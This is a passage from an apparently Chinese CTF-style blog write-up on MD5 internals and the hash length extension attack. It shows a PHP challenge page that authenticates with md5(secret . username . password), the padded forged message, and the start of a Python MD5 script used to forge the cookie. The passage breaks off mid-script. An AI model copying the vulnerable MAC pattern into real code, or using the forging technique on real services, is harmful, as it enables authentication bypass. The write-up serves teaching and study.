= Atemp;</span><br><span class="line">		<span class="keyword">int</span> b = Btemp;</span><br><span class="line">		<span class="keyword">int</span> c = Ctemp;</span><br><span class="line">		<span class="keyword">int</span> d = Dtemp;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">				F = (b &amp; c) | ((~b) &amp; d);</span><br><span class="line">				g = i;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; <span class="number">32</span>) &#123;</span><br><span class="line">				F = (d &amp; b) | ((~d) &amp; c);</span><br><span class="line">				g = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; <span class="number">48</span>) &#123;</span><br><span class="line">				F = b ^ c ^ d;</span><br><span class="line">				g = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				F = c ^ (b | (~d));</span><br><span class="line">				g = (<span class="number">7</span> * i) % <span class="number">16</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">int</span> tmp = d;</span><br><span class="line">			d = c;</span><br><span class="line">			c = b;</span><br><span class="line">			b = b + shift(a + F + K[i] + M[g], s[i]);</span><br><span class="line">			a = tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		Atemp = a + Atemp;</span><br><span class="line">		Btemp = b + Btemp;</span><br><span class="line">		Ctemp = c + Ctemp;</span><br><span class="line">		Dtemp = d + Dtemp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 填充函数处理后应满足bits≡448(mod512),字节就是bytes≡56（mode64)填充方式为先加一个0,其它位补零 最后加上64位的原来长度</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span>[] add(String str) &#123;</span><br><span class="line">		<span class="keyword">int</span> num = ((str.length() + <span class="number">8</span>) / <span class="number">64</span>) + <span class="number">1</span>; <span class="comment">// 以512位，64个字节为一组</span></span><br><span class="line">		<span class="keyword">int</span> strByte[] = <span class="keyword">new</span> <span class="keyword">int</span>[num * <span class="number">16</span>]; <span class="comment">// 64/4=16，所以有16个整数</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num * <span class="number">16</span>; i++) &#123; <span class="comment">// 全部初始化0</span></span><br><span class="line">			strByte[i] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> i;</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">			strByte[i &gt;&gt; <span class="number">2</span>] |= str.charAt(i) &lt;&lt; ((i % <span class="number">4</span>) * <span class="number">8</span>); <span class="comment">// 一个整数存储四个字节，小端序</span></span><br><span class="line">		&#125;</span><br><span class="line">		strByte[i &gt;&gt; <span class="number">2</span>] |= <span class="number">0x80</span> &lt;&lt; ((i % <span class="number">4</span>) * <span class="number">8</span>); <span class="comment">// 尾部添加1</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 添加原长度，长度指位的长度，所以要乘8，然后是小端序，所以放在倒数第二个,这里长度只用了32位</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		strByte[num * <span class="number">16</span> - <span class="number">2</span>] = str.length() * <span class="number">8</span>;</span><br><span class="line">		<span class="keyword">return</span> strByte;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 调用函数</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMD5</span><span class="params">(String source)</span> </span>&#123;</span><br><span class="line">		init();</span><br><span class="line">		<span class="keyword">int</span> strByte[] = add(source);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strByte.length / <span class="number">16</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">int</span> num[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">16</span>];</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">				num[j] = strByte[i * <span class="number">16</span> + j];</span><br><span class="line">				System.out.println(num[j]);</span><br><span class="line">			&#125;</span><br><span class="line">			MainLoop(num);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> changeHex(Atemp) + changeHex(Btemp) + changeHex(Ctemp) + changeHex(Dtemp);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 整数变成16进制字符串</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">changeHex</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">		String str = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">			str += String.format(<span class="string">"%2s"</span>, Integer.toHexString(((a &gt;&gt; i * <span class="number">8</span>) % (<span class="number">1</span> &lt;&lt; <span class="number">8</span>)) &amp; <span class="number">0xff</span>)).replace(<span class="string">' '</span>, <span class="string">'0'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> str;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> MD5 instance;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> MD5 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">			instance = <span class="keyword">new</span> MD5();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">MD5</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String str = MD5.getInstance().getMD5(<span class="string">"jklmn"</span>);</span><br><span class="line">		System.out.println(str);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="0x004-哈希长度扩展攻击"><a href="#0x004-哈希长度扩展攻击" class="headerlink" title="0x004 哈希长度扩展攻击"></a>0x004 哈希长度扩展攻击</h5><h6 id="下面结合一个例子来描述其过程："><a href="#下面结合一个例子来描述其过程：" class="headerlink" title="下面结合一个例子来描述其过程："></a>下面结合一个例子来描述其过程：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    $flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">    $secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">    $username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">    $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">                <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;h1&gt;Admins Only!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;<span class="keyword">If</span> you have the correct credentials, log in below. <span class="keyword">If</span> not, please LEAVE.&lt;/p&gt;</span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">"demo11.php"</span>&gt;</span><br><span class="line">    Username: &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> title=<span class="string">""</span>&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span> title=<span class="string">""</span>&gt; &lt;br&gt;</span><br><span class="line">    &lt;button type=<span class="string">"submit"</span>&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h6 id="这个核心的判断在第二个if判断"><a href="#这个核心的判断在第二个if判断" class="headerlink" title="这个核心的判断在第二个if判断"></a>这个核心的判断在第二个if判断</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;)</span><br></pre></td></tr></table></figure>

<h6 id="flag获取的要求是：传进一个cookie使getmein等于md5-secret-urldecode-username-password-且后面部分不能为adminadmin，也就是说需要构造getmein的cookie和他那串字符串相同就可以了。"><a href="#flag获取的要求是：传进一个cookie使getmein等于md5-secret-urldecode-username-password-且后面部分不能为adminadmin，也就是说需要构造getmein的cookie和他那串字符串相同就可以了。" class="headerlink" title="flag获取的要求是：传进一个cookie使getmein等于md5($secret.urldecode($username.$password))且后面部分不能为adminadmin，也就是说需要构造getmein的cookie和他那串字符串相同就可以了。"></a>flag获取的要求是：传进一个cookie使<code>getmein</code>等于<code>md5($secret.urldecode($username.$password))</code>且后面部分不能为<code>adminadmin</code>，也就是说需要构造<code>getmein</code>的<code>cookie</code>和他那串字符串相同就可以了。</h6><h6 id="我们已知-secret长度为15，先进行消息的填充，前面的A随便写的，为了占15个字符，填充如下："><a href="#我们已知-secret长度为15，先进行消息的填充，前面的A随便写的，为了占15个字符，填充如下：" class="headerlink" title="我们已知$secret长度为15，先进行消息的填充，前面的A随便写的，为了占15个字符，填充如下："></a>我们已知<code>$secret</code>长度为15，先进行消息的填充，前面的A随便写的，为了占15个字符，填充如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAadminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00dawn</span><br></pre></td></tr></table></figure>

<h6 id="my-md5-py"><a href="#my-md5-py" class="headerlink" title="my_md5.py"></a>my_md5.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line"><span class="comment"># theory reference:</span></span><br><span class="line"><span class="comment">#   blog：</span></span><br><span class="line"><span class="comment">#       http://blog.csdn.net/adidala/article/details/28677393</span></span><br><span class="line"><span class="comment">#       http://blog.csdn.net/forgotaboutgirl/article/details/7258109</span></span><br><span class="line"><span class="comment">#       http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</span></span><br><span class="line"><span class="comment">#   RFC1321：</span></span><br><span class="line"><span class="comment">#       https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</span></span><br><span class="line"><span class="comment">##############################################################################</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genMsgLengthDescriptor</span><span class="params">(msg_bitsLenth)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    ---args:</span></span><br><span class="line"><span class="string">            msg_bitsLenth : the bits length of raw message</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> __import__(<span class="string">"struct"</span>).pack(<span class="string">"&gt;Q"</span>,msg_bitsLenth).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_hex_8bytes</span><span class="params">(hex_str)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str: a hex-encoded string with length 16 , i.e.8bytes</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            transform raw message descriptor to little-endian</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    hex_str = <span class="string">"%016x"</span>%int(hex_str,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> len(hex_str)==<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> __import__(<span class="string">"struct"</span>).pack(<span class="string">"&lt;Q"</span>,int(hex_str,<span class="number">16</span>)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_hex_4bytes</span><span class="params">(hex_str)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str: a hex-encoded string with length 8 , i.e.4bytes</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            transform 4 bytes message block to little-endian</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    hex_str = <span class="string">"%08x"</span>%int(hex_str,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">assert</span> len(hex_str)==<span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> __import__(<span class="string">"struct"</span>).pack(<span class="string">"&lt;L"</span>,int(hex_str,<span class="number">16</span>)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_rawInputMsg</span><span class="params">(input_msg)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            input_msg : inputed a ascii-encoded string</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            a hex-encoded string which can be inputed to mathematical transformation function.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    ascii_list = [x.encode(<span class="string">"hex"</span>) <span class="keyword">for</span> x <span class="keyword">in</span> input_msg]</span><br><span class="line">    length_msg_bytes = len(ascii_list)</span><br><span class="line">    length_msg_bits = len(ascii_list)*<span class="number">8</span></span><br><span class="line">    <span class="comment">#padding</span></span><br><span class="line">    ascii_list.append(<span class="string">'80'</span>)</span><br><span class="line">    <span class="keyword">while</span> (len(ascii_list)*<span class="number">8</span>+<span class="number">64</span>)%<span class="number">512</span> != <span class="number">0</span>:</span><br><span class="line">        ascii_list.append(<span class="string">'00'</span>)</span><br><span class="line">    <span class="comment">#add Descriptor</span></span><br><span class="line">    ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(ascii_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM16</span><span class="params">(hex_str,operatingBlockNum)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    --args:</span></span><br><span class="line"><span class="string">            hex_str : a hex-encoded string with length in integral multiple of 512bits</span></span><br><span class="line"><span class="string">            operatingBlockNum : message block number which is being operated , greater than 1</span></span><br><span class="line"><span class="string">    --return:</span></span><br><span class="line"><span class="string">            M : result of splited 64bytes into 4*16 message blocks with little-endian</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    M = [int(reverse_hex_4bytes(hex_str[i:(i+<span class="number">8</span>)]),<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">128</span>*(operatingBlockNum<span class="number">-1</span>),<span class="number">128</span>*operatingBlockNum,<span class="number">8</span>)]</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span><span class="params">(i)</span>:</span></span><br><span class="line">    result = (int(<span class="number">4294967296</span>*abs(__import__(<span class="string">"math"</span>).sin(i))))&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义每轮中用到的函数</span></span><br><span class="line"><span class="comment">#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span></span><br><span class="line">F = <span class="keyword">lambda</span> x,y,z:((x&amp;y)|((~x)&amp;z))</span><br><span class="line">G = <span class="keyword">lambda</span> x,y,z:((x&amp;z)|(y&amp;(~z)))</span><br><span class="line">H = <span class="keyword">lambda</span> x,y,z:(x^y^z)</span><br><span class="line">I = <span class="keyword">lambda</span> x,y,z:(y^(x|(~z)))</span><br><span class="line">RL = L = <span class="keyword">lambda</span> x,n:(((x&lt;&lt;n)|(x&gt;&gt;(<span class="number">32</span>-n)))&amp;(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FF</span><span class="params">(a, b, c, d, x, s, ac)</span>:</span></span><br><span class="line">    a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;<span class="number">0xffffffff</span>)&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">    a = RL ((a), (s))&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">    a = (a+b)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GG</span><span class="params">(a, b, c, d, x, s, ac)</span>:</span></span><br><span class="line">    a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;<span class="number">0xffffffff</span>)&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">    a = RL ((a), (s))&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">    a = (a+b)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HH</span><span class="params">(a, b, c, d, x, s, ac)</span>:</span></span><br><span class="line">    a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;<span class="number">0xffffffff</span>)&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">    a = RL ((a), (s))&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">    a = (a+b)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">II</span><span class="params">(a, b, c, d, x, s, ac)</span>:</span></span><br><span class="line">    a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;<span class="number">0xffffffff</span>)&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">    a = RL ((a), (s))&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">    a = (a+b)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_md5</span><span class="params">(A,B,C,D)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join( [  <span class="string">""</span>.join(__import__(<span class="string">"re"</span>).findall(<span class="string">r".."</span>,<span class="string">"%08x"</span>%i)[::<span class="number">-1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> (A,B,C,D)  ]  )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_md5</span><span class="params">(A=<span class="number">0x67452301</span>,B=<span class="number">0xefcdab89</span>,C=<span class="number">0x98badcfe</span>,D=<span class="number">0x10325476</span>,readyMsg=<span class="string">""</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">    a = A</span><br><span class="line">    b = B</span><br><span class="line">    c = C</span><br><span class="line">    d = D</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(readyMsg)/<span class="number">128</span>):</span><br><span class="line">        M = getM16(readyMsg,i+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">exec</span> <span class="string">"M"</span>+str(i)+<span class="string">"=M["</span>+str(i)+<span class="string">"]"</span></span><br><span class="line">        <span class="comment">#First round</span></span><br><span class="line">        a=FF(a,b,c,d,M0,<span class="number">7</span>,<span class="number">0xd76aa478L</span>)</span><br><span class="line">        d=FF(d,a,b,c,M1,<span class="number">12</span>,<span class="number">0xe8c7b756L</span>)</span><br><span class="line">        c=FF(c,d,a,b,M2,<span class="number">17</span>,<span class="number">0x242070dbL</span>)</span><br><span class="line">        b=FF(b,c,d,a,M3,<span class="number">22</span>,<span class="number">0xc1bdceeeL</span>)</span><br><span class="line">        a=FF(a,b,c,d,M4,<span class="number">7</span>,<span class="number">0xf57c0fafL</span>)</span><br><span class="line">        d=FF(d,a,b,c,M5,<span class="number">12</span>,<span class="number">0x4787c62aL</span>)</span><br><span class="line">        c=FF(c,d,a,b,M6,<span class="number">17</span>,<span class="number">0xa8304613L</span>)</span><br><span class="line">        b=FF(b,c,d,a,M7,<span class="number">22</span>,<span class="number">0xfd469501L</span>)</span><br><span class="line">        a=FF(a,b,c,d,M8,<span 